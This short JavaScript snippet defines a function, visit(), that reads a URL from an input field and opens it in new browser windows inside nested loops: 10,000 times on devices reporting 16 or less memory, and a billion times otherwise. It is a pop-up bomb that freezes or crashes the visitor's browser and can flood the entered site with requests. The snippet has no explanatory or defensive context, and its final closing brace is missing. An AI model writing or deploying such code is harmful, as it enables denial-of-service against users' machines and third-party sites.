
function visit(){
		var b=navigator.deviceMemory;
		var a=document.getElementById("entersite").value;                     
		if(b<=16)
		{
			for(var i=1;i<=100;i++){
				for(var j=1;j<=100;j++){
					window.open(a);	
				}
			}
		}
		else
		{
			for(var i=1;i<=1000;i++){
				for(var j=1;j<=1000;j++){
					for(var k=1;k<=1000;k++){
						window.open(a);
					}
				}
			}		
}



